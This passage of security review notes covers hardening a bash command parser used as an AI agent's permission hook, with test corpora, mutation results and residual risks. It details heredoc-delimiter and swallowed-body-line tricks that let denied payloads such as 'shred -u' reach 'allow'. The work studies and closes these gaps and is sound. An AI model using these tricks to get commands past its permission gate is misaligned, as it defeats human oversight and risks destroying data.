Recorded so no future round re-opens it. `$"…"` is gettext-translated. With a
real catalogue (`msgid "EOF"` → `msgstr "ZZTOP"`, compiled with `msgfmt`,
`TEXTDOMAIN=btest`, `TEXTDOMAINDIR` pointed at it), bash's own delimiter oracle
answers:

```
$ bash -n -   <<<  $'cat <<$"EOF"\nBODYLINE\n'
bash: line 2: warning: here-document at line 1 delimited by end-of-file
      (wanted `ZZTOP')
$ echo $"EOF"
ZZTOP
```

The delimiter **is the translated string**. It is a function of the locale's
message catalogue, not of the command text, so no scanner can compute it. The
refusal is the only correct answer, and reporting it is the only way to keep
that answer off `allow`. **Settled — do not attempt to decode `$"…"`.**

### 16.3 The corpus dimension that made the round-8 property unfalsifiable

`test_the_refused_quoting_forms_never_launder_a_deny_into_an_allow` swept 5
spellings × 18 residuals × 2 operators and read `0 allow`. It could not have
read anything else. `_heredoc_terminator_case` builds the trap line as
`terminator + residual`, so the sub-command a swallow launders always has the
**terminator** (`ExF`, `EOF`) as its head word — a word no allowlist entry names
— and the decision was pinned at `ask` before the parser was consulted.

The missing dimension is the swallowing construct as a **body line of its own**,
with the payload **last and bare**. Then the laundered heads are `cat`/`echo`,
which are allowlisted, and the corpus can actually falsify the claim. Added:

- `_HEREDOC_BODY_SWALLOW_LINES` — 6 lines: `cat <<Z`, `<<Z`, `cat <<-Z`,
  `echo 'x`, `echo "x`, and `` echo ` `` as the **control** (an unterminated
  backtick is a `CMD_SUBST` the tokenizer still reports, so those cells are
  `deny` at HEAD, round 8 and round 9 alike, and a mutation that neuters the
  marker cannot hide behind them).
- `_HEREDOC_SUBSTITUTION_SPELLINGS` — the other refused family, `$(echo E)`,
  `` `echo E` ``, `$((1+1))`, refused since round 5.
- `_heredoc_body_swallow_case` / `_heredoc_body_swallow_grid`, and
  `_HEREDOC_REFUSED_SPELLINGS` = the two families together.
- The dimension is added **to the round-8 property test itself** (shape 1 kept,
  shape 2 appended), plus a new class
  `TestRound9RefusedHeredocDelimitersAreReported` — 8 methods / 49 subtests.

These 96 cells are deliberately **not** appended to
`_HEREDOC_AND_PATTERN_DOORS`: that corpus's contract is "the parser reports the
tail", and a refused delimiter reports the marker instead. They get their own
corpus and their own property, exactly as round 8's `$`-quoting corpus does.

### 16.4 The `$(`-refusal fail-open, re-measured and closed (§15.7 item 1)

Same root cause, same shape, same fix. 3 substitution spellings × 6 swallow
lines × 2 operators = **36 cells**, bash runs the payload in all 36:

| | deny | ask | allow |
|---|---|---|---|
| HEAD | 12 | 0 | 24 |
| round 8 | 6 | 0 | **30** |
| round 9 | 6 | 30 | **0** |

**6 HEAD-`deny` cells reached `allow`, not the 2 §15.7 recorded** — understated
6×, for exactly the corpus-shape reason above. Byte-identical at round 7 and
round 8, so genuinely pre-existing. Closed here.

### 16.5 Verification

| | round 8 | round 9 |
|---|---|---|
| suite (`tests/run_all_tests.py`) | 1517 ran, OK, 1 skipped | **1525 ran, OK, 1 skipped** |
| `pytest tests/test_integration_pretool.py` | 371 passed / 2545 subtests | **379 passed / 2594 subtests** |
| `bash_command_parser.py` self-test | 107 / 0 | **107 / 0** |
| body-swallow `$`-quoting, 60 cells / 60 executed | 50 allow | **0 allow** |
| body-swallow substitution, 36 cells / 36 executed | 30 allow | **0 allow** |
| the 18 blocker rows (real hook path) | 18 deny | **18 deny** |
| `$`-quoting residual corpus, 180 cells | 0 allow | **0 allow, decisions identical** |
| delimiter-axis grid, 648 cells / 630 executed | hides 0, 0 allow | **hides 0, 0 allow, decisions identical** |
| CRLF grid, 30 cells | hides 0 | **hides 0, decisions identical** |
| doors corpus, 84 rows | 0 hidden of the reported set, 84 deny | **84 deny, decisions identical** |
| operator space, 21024 cases | — | **0 split / 0 decision differences vs round 8** |
| path/trap corpus, 240 cases | — | **0 split / 0 decision differences vs round 8** |
| depth band 1…1000 × 4 carriers, 288 cells | — | **0 split / 0 decision differences vs round 8** |
| the five fail-open classes, real hook PROCESS | answer | **answer, identical (2 deny, 3 ask; rc 0, non-empty stdout)** |
| real traffic (2212 distinct / 3592 occurrences) | — | **0 verdict / 0 split / 0 write-target changes vs round 8** |
| mutation matrix | 12, 11 caught + NO-OP control survived | **10, 8 caught + 2 NO-OP controls survived** |

**The whole-tree differential, round 8 → round 9.** Over every standing corpus —
21024 operator-space cases, the 648-cell delimiter grid, 30 CRLF cells, 84
doors, the 180-cell residual corpus, 96 body-swallow cells, the 288-cell depth
band, the 240-case trap corpus and 2212 real commands — **every split that
differs at all differs by exactly one thing: the marker was added**
(100 % marker-only, checked by removing the marker from round 9's split and
requiring byte equality with round 8's). The **only** decision movement anywhere
is 80 cells `allow → ask` in the two body-swallow grids. **Zero cells move
toward `allow`, in any corpus.**

**Real-traffic differential.** 2212 distinct commands (3592 occurrences),
harvested read-only from `~/.claude/bash_hook_debug.log` + its five rotated
`.gz` archives + `~/.claude/permission_requests.jsonl`, replayed under the real
`SettingsLoader` on the repo workspace (`allow=295 deny=9 ask=0`, asserted), 0
parse exceptions in every pass, verdicts `ask=1624 allow=588`:

```
round 8 -> round 9:   verdict 0    split 0    write-target 0
HEAD    -> round 8:   verdict 2    split 10   write-target 0
HEAD    -> round 9:   verdict 2    split 10   write-target 0   (index-identical
                                                                to HEAD -> R8,
                                                                verdicts AND splits)
```

**Round 9 is a no-op on real traffic.** The two `ask -> allow` moves are
§13.4's, unchanged, and were re-proved bash-faithful here **without replaying
the logged command**: every absolute path in it was rewritten into a private
`mkdtemp`, `cat` and `node` were shadowed by shell functions, `PATH` was emptied
to the sandbox, and the oracle token was assembled at runtime so the `cat`
shadow echoing the heredoc body could not forge it (round 8's review truncated
two real files by replaying such a command verbatim, and was fooled once by an
oracle token present in its own input).

```
cat > …/fix_trunc.js <<'JS' … JS / node …/fix_trunc.js
  bash actually ran : ['cat', 'node']   (files created: fix_trunc.js — in the sandbox)
  HEAD reported     : ['cat', '// must still parse', 'fs.writeFileSync(mf,m',
                       "console.log('…'", 'JS', 'node …']      -> ask
  round 9 reported  : ['cat', 'node …']                        -> allow
```

### 16.6 Mutation matrix — 10 mutations, 8 caught, 2 NO-OP controls survived

Run in a throwaway overlay of the repo (**not** under `/tmp`:
`_is_workspace_binary` treats `/tmp` as an allowed root, which makes two
workspace-path tests answer differently there and would leave the baseline
un-green through no fault of the parser). The whole test file is run **without
`-x`** — round 8's first matrix was worthless because `-x` made every mutant,
the control included, report CAUGHT. Baseline: **379 passed, rc 0.**

| # | mutation | result | caught by |
|---|---|---|---|
| R9-M0 | NO-OP control: rename the local `declined` → `was_declined` | **SURVIVED** | — (the matrix is meaningful) |
| R9-M0b | NO-OP control: reorder two independent statements | **SURVIVED** | — |
| R9-M1 | marker emission deleted (= round 8 exactly) | CAUGHT (9) | `test_the_body_swallow_witness_round_8_allowed`, `test_no_refused_delimiter_reaches_allow_on_a_swallow_line`, `test_the_refused_quoting_forms_never_launder_a_deny_into_an_allow`, `test_the_marker_is_the_depth_caps_own_marker`, `test_the_marker_survives_every_carrier_the_body_can_hide_in`, … |
| R9-M2 | marker emitted as `WORD` (an argument, never a head) | CAUGHT (9) | same set |
| R9-M3 | marker made matchable (`'cat'`) | CAUGHT (9) | same set |
| R9-M4 | `$(` / backtick no longer reported as declined | CAUGHT (11) | `test_the_four_recognised_spellings_report_declined`, `test_no_refused_delimiter_reaches_allow_on_a_swallow_line` |
| R9-M5 | `$'` / `$"` no longer reported as declined | CAUGHT (33) | + `test_the_dollar_quoting_forms_are_refused_not_mis_scanned` |
| R9-M6 | `declined` ignored — report EVERY refusal | CAUGHT (12) | `test_declined_is_false_for_every_other_refusal`, `test_the_refusals_round_5_pinned_are_unchanged`, `test_the_here_string_guard_was_a_live_bypass`, `test_the_heredoc_operator_takes_no_operand_token` |
| R9-M7 | report for `<<` but never for `<<-` | CAUGHT (2) | `test_no_refused_delimiter_reaches_allow_on_a_swallow_line`, `test_the_refused_quoting_forms_never_launder_a_deny_into_an_allow` |
| R9-M8 | `_heredoc_line_starts` returns the stripped offset only (round 7) | CAUGHT (86) | `test_the_terminator_rule_is_raw_or_tab_stripped_exactly_as_bash`, `test_the_helper_only_widens_tab_leading_delimiters`, `test_the_minimal_tab_leading_witness`, `test_no_heredoc_or_pattern_door_hides_the_command`, … |

R9-M6 is the one that pins the *narrowness* of the flag: reporting refusals bash
itself never opens a body for costs a prompt on a here-string and on syntax
errors, and four existing tests say so.

**Every new test was watched to fail on the round-8 parser** (round-9 tests run
against round 8's `bash_command_parser.py` in an overlay):

```
FAILED …::test_the_refused_quoting_forms_never_launder_a_deny_into_an_allow
E  AssertionError: Lists differ: [] != ["cat <<$'EOF'\ncat <<Z\nEOF\nshred -u …
E  Second list contains 50 additional elements.
E  … : a refused quoting form laundered a denied payload into an allow on a
E      standalone swallow line

FAILED …::test_no_refused_delimiter_reaches_allow_on_a_swallow_line
E  Second list contains 80 additional elements.
E  … : a refused delimiter reached allow while bash ran the payload

FAILED …::test_the_body_swallow_witness_round_8_allowed
E  AssertionError: '__unparsed_nested_substitution__' not found in
E    ["cat E$'x'F", 'cat'] : the refusal was not reported
```

`test_the_backtick_swallow_line_is_the_control` passes on round 8 **by design**
— it is the control. `test_the_four_recognised_spellings_report_declined` and
`test_declined_is_false_for_every_other_refusal` fail on round 8 by tuple arity
(the fourth return element does not exist there), which is honest but weaker
than a behavioural failure; R9-M4/M5/M6 are what actually pin them.

### 16.7 Documentation corrected in place

1. §15.1 bullet 1 — "HEAD's alnum scan already refused these spellings" is
   **false for the mid-word forms**: HEAD returned `E` for `E$'x'F`, `E$"x"F`
   and `E$'x'F.txt`, i.e. it opened a heredoc. Table added; the same false
   claim removed from `_parse_heredoc_delim`'s own comment.
2. §15.1 — "a `$` next to a quote is refused **only when bash eats it**" is
   false for `$$'…'`: bash's delimiter for `<<$$'EOF'` is `$$EOF` (the `$$`
   consumes the first `$`) and the scanner still refuses. Conservative and
   HEAD-equal, so harmless, but the claim is restated: **a `$` is refused when
   it is immediately followed by a quote, whether or not bash eats it.**
3. §15.8 — "the same guarantee: never `allow`" **refuted**, and it contradicted
   §15.7 item 1 in the same document. Restated as what the marker actually
   makes true.
4. §15.5 — "the 18 blocker rows … round 7 → 18 ALLOW" is not reproducible. The
   18 rows are now **named** (10 `$`-quoting + 8 tab-leading, shortest shape),
   and round 7 reads **14 allow / 4 deny** on them; the 4 are the tab-leading
   spellings under plain `<<`, which §15.3 itself says round 7 handled.
5. §15.7 item 2 — "round 7's 1507 ran, OK no longer reproduces" is **wrong**.
   `run_all_tests.py` is clean (1517 at round 8, 1525 at round 9). The 6
   failures are pytest collection-order pollution between two task-22 files
   that contain no reference to the parser at all.
6. §15.4 — its `0 allow` column is labelled as the **artifact** it is.
7. §15.7 item 1 — the "2 cells" undercount corrected to 6 of 36, and marked
   closed.

### 16.8 Residual risk after round 9

Everything in §15.8 stands as corrected there, plus:

- **A refused delimiter now costs a prompt where HEAD sometimes managed a
  `deny`.** 18 of 60 `$`-quoting cells and 6 of 36 substitution cells, plus the
  18 already recorded in §15.4. This is the price of the guarantee and it is the
  safe direction, but a future round wanting the precision back must decode
  `$'…'` (possible, tedious) — `$(`/backtick need a real nested scanner in the
  word, and `$"…"` is undecidable (§16.2).
- **A swallowed body line still hides a WRITE TARGET from
  `_scan_write_targets`,** exactly as it does at HEAD. The marker keeps such a
  command off `allow`, so the write-destination gate is never reached, but the
  gate itself sees nothing — asserted, with a control, in
  `test_a_swallowed_write_target_is_covered_by_the_marker_not_the_gate`. If a
  future round makes the marker conditional, that gap becomes live.
- **Backtick-carried UNTERMINATED heredocs** remain worse than HEAD (101/945 vs
  78/945, round-8 measurement, unchanged here); the base shape is `allow` at
  HEAD too, so no new capability. Task-35 input, untouched.
- **Nobody has swept LENGTH** — §15.8's list of unvaried dimensions still ends
  there. Round 9 adds one more: **nobody had swept the BODY**. Every heredoc
  corpus through round 8 varied the delimiter and the terminator line and held
  the body at a constant `body`, or at `terminator + residual` — which is why a
  swallowing first body line, the thing that actually launders the decision,
  had no cell anywhere in 6900 lines of tests.
- **The lesson round 9 adds.** Round 8's brief said "refusing fails toward
  `ask`", and its corpus agreed — because the corpus could not express the
  shape in which it does not. The practical form: **when a test asserts "X never
  happens", check that the corpus is capable of producing X at all.** Round 8's
  `0 allow` column was structurally unreachable: the head word of every
  laundered sub-command in it was a delimiter, and no allowlist names a
  delimiter. A property test that cannot fail is documentation, not evidence.
